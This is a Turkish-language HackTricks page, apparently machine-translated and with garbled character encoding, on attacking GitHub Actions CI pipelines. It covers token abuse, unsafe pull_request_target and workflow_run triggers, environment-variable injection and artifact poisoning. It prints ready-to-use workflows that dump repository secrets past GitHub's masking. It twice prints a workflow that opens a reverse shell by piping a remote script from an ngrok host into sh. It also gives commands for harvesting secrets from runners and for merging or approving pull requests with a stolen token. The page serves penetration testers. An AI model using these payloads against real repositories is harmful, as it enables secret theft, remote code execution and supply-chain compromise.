# Github Actions KÃ¶tÃ¼ye Kullanma

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Temel Bilgiler

Bu sayfada ÅŸunlarÄ± bulacaksÄ±nÄ±z:

* Bir saldÄ±rganÄ±n bir Github Action'a eriÅŸim saÄŸlamasÄ± durumunda **tÃ¼m etkilerin Ã¶zeti**
* Bir eyleme eriÅŸim saÄŸlamanÄ±n **farklÄ± yollarÄ±**:
* Eylemi oluÅŸturma **izinleri**ne sahip olmak
* **Ã‡ekme isteÄŸi** ile ilgili tetikleyicileri kÃ¶tÃ¼ye kullanmak
* DiÄŸer **harici eriÅŸim** tekniklerini kÃ¶tÃ¼ye kullanmak
* Zaten etkilenmiÅŸ bir repo'dan **dÃ¶nÃ¼ÅŸ yapmak**
* Son olarak, iÃ§eriden bir eylemi kÃ¶tÃ¼ye kullanmak iÃ§in **son aÅŸama saldÄ±rÄ± teknikleri** hakkÄ±nda bir bÃ¶lÃ¼m (yukarÄ±da bahsedilen etkileri nedeniyle)

## Etkilerin Ã–zeti

[**Github Actions hakkÄ±nda temel bilgilere**](../basic-github-information.md#github-actions) giriÅŸ iÃ§in.

Bir **dizin iÃ§inde keyfi Github eylemleri/kod enjekte edebilirseniz**, ÅŸunlarÄ± yapabilirsiniz:

* O repo/organizasyondan **sÄ±rlarÄ± Ã§almak**.
* Sadece enjekte edebiliyorsanÄ±z, zaten iÅŸ akÄ±ÅŸÄ±nda bulunan her ÅŸeyi Ã§alabilirsiniz.
* AWS ve GCP gibi diÄŸer platformlara eriÅŸmek iÃ§in **repo ayrÄ±calÄ±klarÄ±nÄ±** kÃ¶tÃ¼ye kullanmak.
* Ã–zel iÅŸÃ§iler kullanÄ±lÄ±yorsa, **Ã¶zel iÅŸÃ§ilerde kodu yÃ¼rÃ¼tmek** ve oradan dÃ¶nÃ¼ÅŸ yapmaya Ã§alÄ±ÅŸmak.
* Depo **kodunu Ã¼zerine yazmak**.
* Bu, `GITHUB_TOKEN`'Ä±n ayrÄ±calÄ±klarÄ±na baÄŸlÄ±dÄ±r (varsa).
* **DaÄŸÄ±tÄ±mlarÄ±** ve diÄŸer **sanat eserlerini** tehlikeye atmak.
* Kod bir ÅŸeyleri daÄŸÄ±tÄ±yorsa veya depoluyorsa, onu deÄŸiÅŸtirebilir ve daha fazla eriÅŸim elde edebilirsiniz.

## GITHUB\_TOKEN

Bu "**gizli**" (`${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}` ile gelen) seÃ§enek etkinleÅŸtirildiÄŸinde verilen bir token'dÄ±r:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github UygulamasÄ±'nÄ±n kullanacaÄŸÄ±** aynÄ± token olduÄŸu iÃ§in aynÄ± uÃ§ noktalara eriÅŸebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github, bir repo'nun `GITHUB_TOKEN` kullanarak diÄŸer dahili getirepo'lara eriÅŸmesine izin veren bir [**akÄ±ÅŸ**](https://github.com/github/roadmap/issues/74) yayÄ±nlamalÄ±dÄ±r.
{% endhint %}

Bu token'Ä±n olasÄ± **izinlerini** [burada](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) gÃ¶rebilirsiniz.

Bu token'lar iÅŸlem tamamlandÄ±ktan sonra **geÃ§erliliÄŸini yitirir**.\
Bu token'lar ÅŸuna benzer: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceÄŸiniz bazÄ± ilginÃ§ ÅŸeyler:

{% tabs %}
{% tab title="PR BirleÅŸtir" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="PR'yi Onayla" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% tab title="PR OluÅŸtur" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Dikkat, birkaÃ§ durumda Github Actions envs iÃ§inde veya secrets iÃ§inde **github kullanÄ±cÄ± tokenlarÄ± bulabileceÄŸinizi** unutmayÄ±n. Bu tokenlar size depo ve organizasyon Ã¼zerinde daha fazla yetki verebilir.
{% endhint %}

<details>

<summary>Github Action Ã§Ä±ktÄ±sÄ±nda secrets listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Gizli bilgilerle ters kabuk alÄ±n</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Github Token'un diÄŸer kullanÄ±cÄ±larÄ±n depolarÄ±ndaki izinlerini kontrol etmek iÃ§in Github eylemlerinin gÃ¼nlÃ¼klerini kontrol etmek mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Ä°zin Verilen YÃ¼rÃ¼tme

{% hint style="info" %}
Bu, Github eylemlerini tehlikeye atmanÄ±n en kolay yolu olabilir, Ã§Ã¼nkÃ¼ bu durumda **kuruluÅŸ iÃ§inde yeni bir repo oluÅŸturma** veya **bir depoya yazma yetkisi** sahip olmanÄ±z gerekmektedir.

Bu senaryoda iseniz, [Post Exploitation tekniklerini](./#post-exploitation-techniques-from-inside-an-action) kontrol edebilirsiniz.
{% endhint %}

### Repo OluÅŸturma ile YÃ¼rÃ¼tme

Bir kuruluÅŸun Ã¼yeleri **yeni repo oluÅŸturabiliyorsa** ve github eylemlerini yÃ¼rÃ¼tebiliyorsanÄ±z, **yeni bir repo oluÅŸturabilir ve kuruluÅŸ dÃ¼zeyinde ayarlanan sÄ±rlarÄ± Ã§alabilirsiniz**.

### Yeni Bir Dal ile YÃ¼rÃ¼tme

Zaten yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir Github Eylemi iÃ§eren bir depoda **yeni bir dal oluÅŸturabiliyorsanÄ±z**, onu **deÄŸiÅŸtirebilir**, iÃ§eriÄŸi **yÃ¼kleyebilir** ve ardÄ±ndan **yeni dal Ã¼zerinden bu eylemi yÃ¼rÃ¼tebilirsiniz**. Bu ÅŸekilde, depo ve kuruluÅŸ dÃ¼zeyindeki sÄ±rlarÄ± **dÄ±ÅŸarÄ±ya Ã§Ä±karabilirsiniz** (ancak nasÄ±l adlandÄ±rÄ±ldÄ±klarÄ±nÄ± bilmelisiniz).

DeÄŸiÅŸtirilmiÅŸ eylemi **manuel olarak** yÃ¼rÃ¼tme yapabilirsiniz, bir **PR oluÅŸturulduÄŸunda** veya **bazÄ± kodlar gÃ¶nderildiÄŸinde** (ne kadar gÃ¼rÃ¼ltÃ¼lÃ¼ olmak istediÄŸinize baÄŸlÄ± olarak):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
Bir saldÄ±rganÄ±n **baÅŸka bir depodaki Github Eylemini yÃ¼rÃ¼tmesine** izin verebilecek farklÄ± tetikleyiciler vardÄ±r. EÄŸer bu tetiklenebilir eylemler kÃ¶tÃ¼ bir ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, bir saldÄ±rgan bunlarÄ± tehlikeye atabilir.
{% endhint %}

### `pull_request`

**`pull_request`** iÅŸ akÄ±ÅŸÄ± tetikleyici, her bir pull isteÄŸi alÄ±ndÄ±ÄŸÄ±nda iÅŸ akÄ±ÅŸÄ±nÄ± yÃ¼rÃ¼tÃ¼r, bazÄ± istisnalarla: varsayÄ±lan olarak, **ilk kez iÅŸbirliÄŸi yaptÄ±ÄŸÄ±nÄ±zda**, bir **sÃ¼rdÃ¼rÃ¼cÃ¼**, iÅŸ akÄ±ÅŸÄ±nÄ±n **Ã§alÄ±ÅŸmasÄ±nÄ± onaylamalÄ±dÄ±r**:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
VarsayÄ±lan sÄ±nÄ±rlama **ilk kez** katkÄ±da bulunanlar iÃ§indir, **geÃ§erli bir hata/yazÄ±m hatasÄ± dÃ¼zeltmesi yaparak katkÄ±da bulunabilir** ve ardÄ±ndan yeni `pull_request` ayrÄ±calÄ±klarÄ±nÄ±zÄ± kÃ¶tÃ¼ye kullanmak iÃ§in **diÄŸer PR'ler gÃ¶nderebilirsiniz**.

**Bunu test ettim ve iÅŸe yaramÄ±yor**: ~~BaÅŸka bir seÃ§enek, projeye katkÄ±da bulunan ve hesabÄ±nÄ± silen birinin adÄ±yla bir hesap oluÅŸturmaktÄ±r.~~
{% endhint %}

AyrÄ±ca, varsayÄ±lan olarak **hedef depoya yazma izinlerini** ve **secrets eriÅŸimini** engeller, [**belgelerde**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) belirtildiÄŸi gibi:

> `GITHUB_TOKEN` hariÃ§, bir iÅŸ akÄ±ÅŸÄ± bir **forked** depodan tetiklendiÄŸinde, **secrets'lar Ã§alÄ±ÅŸtÄ±rÄ±cÄ±ya geÃ§irilmez**. **`GITHUB_TOKEN`'Ä±n salt okunur izinleri**, **forked depolarÄ±ndan** Ã§ekme isteklerinde geÃ§erlidir.

Bir saldÄ±rgan, Github Eyleminin tanÄ±mÄ±nÄ± deÄŸiÅŸtirerek keyfi ÅŸeyler yÃ¼rÃ¼tmek ve keyfi eylemler eklemek iÃ§in yapabilir. Bununla birlikte, bahsedilen sÄ±nÄ±rlamalar nedeniyle, saldÄ±rgan secrets Ã§alamaz veya repo Ã¼zerine yazamaz.

{% hint style="danger" %}
**Evet, saldÄ±rgan PR'de tetiklenecek github eylemini deÄŸiÅŸtirirse, kullanÄ±lacak olan eylem saldÄ±rganÄ±n eylemi olacaktÄ±r, orijin repo eylemi deÄŸil!**
{% endhint %}

SaldÄ±rgan ayrÄ±ca yÃ¼rÃ¼tÃ¼len kodu kontrol ettiÄŸi iÃ§in, `GITHUB_TOKEN` Ã¼zerinde secrets veya yazma izinleri olmasa bile, Ã¶rneÄŸin **zararlÄ± dosyalar yÃ¼kleyebilir**.

### **`pull_request_target`**

**`pull_request_target`** iÅŸ akÄ±ÅŸÄ± tetikleyici, hedef depoya **yazma izinlerine** ve **secrets eriÅŸimine** sahiptir (ve izin istemez).

Dikkat edin, **`pull_request_target`** iÅŸ akÄ±ÅŸÄ± tetikleyicisi, PR tarafÄ±ndan verilen baÄŸlamda deÄŸil, **temel baÄŸlamda** Ã§alÄ±ÅŸÄ±r (gÃ¼venilmeyen kodu **Ã§alÄ±ÅŸtÄ±rmamak** iÃ§in). `pull_request_target` hakkÄ±nda daha fazla bilgi iÃ§in [**belgelere**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target) bakÄ±n.\
AyrÄ±ca, bu Ã¶zel tehlikeli kullanÄ±m hakkÄ±nda daha fazla bilgi iÃ§in bu [**github blog yazÄ±sÄ±na**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) bakÄ±n.

**Ã‡alÄ±ÅŸtÄ±rÄ±lan iÅŸ akÄ±ÅŸÄ±** PR'de tanÄ±mlanan iÅŸ akÄ±ÅŸÄ± yerine **temelde** tanÄ±mlanan iÅŸ akÄ±ÅŸÄ± olduÄŸu iÃ§in **`pull_request_target`** kullanmanÄ±n **gÃ¼venli** olduÄŸu gibi gÃ¶rÃ¼nebilir, ancak **bazÄ± durumlarda** Ã¶yle deÄŸildir.

Ve bu, **secrets eriÅŸimine** sahip olacak.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) tetikleyici, bir iÅŸ akÄ±ÅŸÄ±nÄ± `tamamlandÄ±ÄŸÄ±nda`, `istendiÄŸinde` veya `devam ederken` baÅŸka bir iÅŸ akÄ±ÅŸÄ±ndan Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r.

Bu Ã¶rnekte, ayrÄ± "Run Tests" iÅŸ akÄ±ÅŸÄ± tamamlandÄ±ktan sonra bir iÅŸ akÄ±ÅŸÄ±nÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
AyrÄ±ca, belgelere gÃ¶re: `workflow_run` etkinliÄŸi tarafÄ±ndan baÅŸlatÄ±lan iÅŸ akÄ±ÅŸÄ±, Ã¶nceki iÅŸ akÄ±ÅŸÄ± baÅŸlatÄ±lmamÄ±ÅŸ olsa bile gizliliklere eriÅŸebilir ve token yazabilir.

Bu tÃ¼r bir iÅŸ akÄ±ÅŸÄ±, harici bir kullanÄ±cÄ± tarafÄ±ndan `pull_request` veya `pull_request_target` aracÄ±lÄ±ÄŸÄ±yla tetiklenebilen bir iÅŸ akÄ±ÅŸÄ±na baÄŸlÄ±ysa saldÄ±rÄ±ya uÄŸrayabilir. BirkaÃ§ zayÄ±f Ã¶rnek [bu blogda bulunabilir](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability). Ä°lk Ã¶rnekte, saldÄ±rganÄ±n kodunu indiren `workflow_run` tetiklenen iÅŸ akÄ±ÅŸÄ±: `${{ github.event.pull_request.head.sha }}`\
Ä°kinci Ã¶rnekte, gÃ¼venilmeyen kodun bir artefaktÄ±nÄ± `workflow_run` iÅŸ akÄ±ÅŸÄ±na geÃ§irerek ve bu artefaktÄ±n iÃ§eriÄŸini RCE'ye karÅŸÄ± savunmasÄ±z hale getirecek ÅŸekilde kullanarak saldÄ±rÄ± gerÃ§ekleÅŸtirilebilir.

### `workflow_call`

TODO

TODO: Bir pull_request'den Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kullanÄ±lan/indirilen kodun orijinden mi yoksa Ã§atal PR'den mi olduÄŸunu kontrol et

## Ã‡atal YÃ¼rÃ¼tme SaldÄ±rÄ±sÄ±

Bir github iÅŸ akÄ±ÅŸÄ±nÄ±n nasÄ±l yÃ¼rÃ¼tÃ¼lebileceÄŸini anlattÄ±k, ÅŸimdi bu yÃ¼rÃ¼tmelerin, yanlÄ±ÅŸ yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nda nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸine bakalÄ±m:

### GÃ¼venilmeyen checkout yÃ¼rÃ¼tme

**`pull_request`** durumunda, iÅŸ akÄ±ÅŸÄ± **PR baÄŸlamÄ±nda yÃ¼rÃ¼tÃ¼lecektir** (bu nedenle **zararlÄ± PR kodu yÃ¼rÃ¼tÃ¼lecektir**), ancak Ã¶nce **yetkilendirilmesi gerekmektedir** ve bazÄ± [kÄ±sÄ±tlamalarla](./#pull_request) Ã§alÄ±ÅŸacaktÄ±r.

**`pull_request_target` veya `workflow_run`** kullanan bir iÅŸ akÄ±ÅŸÄ±, **`pull_request_target` veya `pull_request`** tarafÄ±ndan tetiklenebilen bir iÅŸ akÄ±ÅŸÄ±na baÄŸlÄ±ysa, orijinal depodan kod Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r, bu nedenle **saldÄ±rgan yÃ¼rÃ¼tÃ¼len kodu kontrol edemez**.

{% hint style="danger" %}
Ancak, **eylem**, **aÃ§Ä±k bir PR checkout**'a sahipse (ve temel yerine PR'den kod alacaksa), saldÄ±rganÄ±n kontrol ettiÄŸi kodu kullanacaktÄ±r. Ã–rneÄŸin (PR kodunun indirildiÄŸi 12. satÄ±ra bakÄ±n):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># GÃœVENÄ°LMEZ. Sadece bir Ã¶rnek olarak saÄŸlanmÄ±ÅŸtÄ±r.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potansiyel olarak **gÃ¼venilmeyen kod, `npm install` veya `npm build` sÄ±rasÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lmaktadÄ±r** Ã§Ã¼nkÃ¼ derleme komut dosyalarÄ± ve referans alÄ±nan **paketler PR'nin yazarÄ± tarafÄ±ndan kontrol edilmektedir**.

{% hint style="warning" %}
ZararlÄ± eylemleri aramak iÃ§in bir github dorku: `event.pull_request pull_request_target extension:yml` ancak, eylem gÃ¼venli bir ÅŸekilde yapÄ±landÄ±rÄ±lmamÄ±ÅŸ olsa bile (Ã¶rneÄŸin, PR'yi oluÅŸturan aktÃ¶re gÃ¶re koÅŸullu ifadeler kullanarak), iÅŸlerin gÃ¼venli bir ÅŸekilde yÃ¼rÃ¼tÃ¼lmesi iÃ§in farklÄ± yapÄ±landÄ±rma yÃ¶ntemleri vardÄ±r.
{% endhint %}

### BaÄŸlam Komutu EnjeksiyonlarÄ± <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Belirli [**github baÄŸlamlarÄ±**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) kullanÄ±cÄ±nÄ±n PR oluÅŸturduÄŸu deÄŸerlere **kontrol edilebilir**. EÄŸer github eylemi bu verileri **yÃ¼rÃ¼tmek iÃ§in kullanÄ±yorsa**, bu keyfi kod yÃ¼rÃ¼tmesine yol aÃ§abilir:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Komut Enjeksiyonu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Belgelerden: Bir iÅŸ akÄ±ÅŸÄ± iÅŸindeki herhangi bir sonraki adÄ±mlar iÃ§in bir **Ã§evre deÄŸiÅŸkenini kullanÄ±labilir hale getirebilirsiniz**, Ã§evre deÄŸiÅŸkenini tanÄ±mlayarak veya gÃ¼ncelleyerek ve bunu **`GITHUB_ENV`** Ã§evre dosyasÄ±na yazarak.

Bir saldÄ±rgan bu **env** deÄŸiÅŸkenine herhangi bir deÄŸer **enjekte edebilirse**, takip eden adÄ±mlarda **LD\_PRELOAD** veya **NODE\_OPTIONS** gibi kodu yÃ¼rÃ¼tebilecek env deÄŸiÅŸkenlerini enjekte edebilir.

Ã–rneÄŸin ([**bu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**bu**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), bir iÅŸ akÄ±ÅŸÄ± dÃ¼ÅŸÃ¼nÃ¼n, yÃ¼klenen bir artefakÄ± gÃ¼venmeye dayalÄ± olarak iÃ§eriÄŸini **`GITHUB_ENV`** env deÄŸiÅŸkenine depolayan. Bir saldÄ±rgan, bunu tehlikeye atmak iÃ§in aÅŸaÄŸÄ±dakine benzer bir ÅŸey yÃ¼kleyebilir:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### ZayÄ±f NoktalÄ± ÃœÃ§Ã¼ncÃ¼ Taraf Github Eylemleri

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**Bu blog yazÄ±sÄ±nda**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) belirtildiÄŸi gibi, bu Github Eylemi farklÄ± iÅŸ akÄ±ÅŸlarÄ±ndan ve hatta depolardan artefaklara eriÅŸim saÄŸlar.

Sorun ÅŸu ki, **`path`** parametresi ayarlanmazsa, artefakt mevcut dizine Ã§Ä±karÄ±lÄ±r ve daha sonra iÅŸ akÄ±ÅŸÄ±nda kullanÄ±labilecek dosyalarÄ±n Ã¼zerine yazabilir veya hatta yÃ¼rÃ¼tÃ¼lebilir. Bu nedenle, Eylem savunmasÄ±zsa, bir saldÄ±rgan, Artefak'a gÃ¼venen diÄŸer iÅŸ akÄ±ÅŸlarÄ±nÄ± tehlikeye atmak iÃ§in bunu kÃ¶tÃ¼ye kullanabilir.

ZayÄ±f bir iÅŸ akÄ±ÅŸÄ± Ã¶rneÄŸi:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu iÅŸ akÄ±ÅŸÄ±yla saldÄ±rÄ± yapÄ±labilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## DiÄŸer Harici EriÅŸim

### Silinen Namespace Repo KaÃ§Ä±rma

Bir hesap adÄ±nÄ± deÄŸiÅŸtirdiÄŸinde, baÅŸka bir kullanÄ±cÄ± bir sÃ¼re sonra o adla bir hesap kaydedebilir. EÄŸer bir depo, ad deÄŸiÅŸikliÄŸinden Ã¶nce **100'den az yÄ±ldÄ±za** sahipse, Github, aynÄ± adÄ± taÅŸÄ±yan yeni kayÄ±tlÄ± kullanÄ±cÄ±nÄ±n bir **repo oluÅŸturmasÄ±na izin verecektir**.

{% hint style="danger" %}
Bu nedenle, bir eylem, mevcut olmayan bir hesaptan bir repo kullanÄ±yorsa, saldÄ±rgan hala o hesabÄ± oluÅŸturabilir ve eylemi tehlikeye atabilir.
{% endhint %}

EÄŸer diÄŸer depolar, bu kullanÄ±cÄ±nÄ±n depolarÄ±ndan **baÄŸÄ±mlÄ±lÄ±klar kullanÄ±yorsa**, bir saldÄ±rgan onlarÄ± ele geÃ§irebilir. Daha kapsamlÄ± bir aÃ§Ä±klama iÃ§in buraya bakabilirsiniz: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
Bu bÃ¶lÃ¼mde, birinci repo Ã¼zerinde bir tÃ¼r eriÅŸime sahip olduÄŸumuzu varsayarak, **bir repo'dan diÄŸerine geÃ§iÅŸ yapmamÄ±zÄ± saÄŸlayacak tekniklerden** bahsedeceÄŸiz (Ã¶nceki bÃ¶lÃ¼me bakÄ±n).
{% endhint %}

### Ã–nbellek Zehirlenmesi

Bir Ã¶nbellek, **aynÄ± dalda Ã§alÄ±ÅŸan iÅŸ akÄ±ÅŸlarÄ± arasÄ±nda korunur**. Bu, bir saldÄ±rganÄ±n daha sonra bir iÅŸ akÄ±ÅŸÄ± tarafÄ±ndan **indirilen** ve yÃ¼rÃ¼tÃ¼len bir **paket**i ele geÃ§irirse, daha yetkilendirilmiÅŸ bir iÅŸ akÄ±ÅŸÄ±nÄ± da **tehlikeye atabileceÄŸi anlamÄ±na gelir**.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Sanal VarlÄ±k Zehirlenmesi

Ä°ÅŸ akÄ±ÅŸlarÄ±, baÅŸka iÅŸ akÄ±ÅŸlarÄ±ndan ve hatta depolardan **sanal varlÄ±klar kullanabilir**. Bir saldÄ±rgan, baÅŸka bir iÅŸ akÄ±ÅŸÄ± tarafÄ±ndan kullanÄ±lan bir sanal varlÄ±ÄŸÄ± **yÃ¼kselten bir Github Eylemini ele geÃ§irirse**, diÄŸer iÅŸ akÄ±ÅŸlarÄ±nÄ± da **tehlikeye atabilir**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Bir Eylemden SonrasÄ± SÄ±zma

### AWS ve GCP'ye OIDC AracÄ±lÄ±ÄŸÄ±yla EriÅŸim

AÅŸaÄŸÄ±daki sayfalara bakÄ±n:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Secrets'e EriÅŸim <a href="#accessing-secrets" id="accessing-secrets"></a>

Bir betiÄŸe iÃ§erik enjekte ediyorsanÄ±z, sÄ±rlara nasÄ±l eriÅŸebileceÄŸinizi bilmek ilginÃ§ olabilir:

* EÄŸer sÄ±r veya belirteÃ§ bir **Ã§evre deÄŸiÅŸkenine** ayarlanmÄ±ÅŸsa, **`printenv`** kullanarak doÄŸrudan Ã§evreden eriÅŸilebilir.

<details>

<summary>Github Eylem Ã§Ä±ktÄ±sÄ±nda sÄ±rlarÄ± listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Gizli bilgilerle ters kabuk alÄ±n</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* EÄŸer secret **doÄŸrudan bir ifadede** kullanÄ±lÄ±yorsa, oluÅŸturulan kabuk komut dosyasÄ± **diskte** saklanÄ±r ve eriÅŸilebilir.
* ```bash
cat /home/runner/work/_temp/*
```
* Bir JavaScript eylemi iÃ§in, secret'lar Ã§evre deÄŸiÅŸkenleri aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilir.
* ```bash
ps axe | grep node
```
*   **Ã–zel bir eylem** iÃ§in, risk, bir programÄ±n **argÃ¼mandan** elde ettiÄŸi secret'i nasÄ±l kullandÄ±ÄŸÄ±na baÄŸlÄ± olarak deÄŸiÅŸebilir:

```yaml
uses: fakeaction/publish@v3
with:
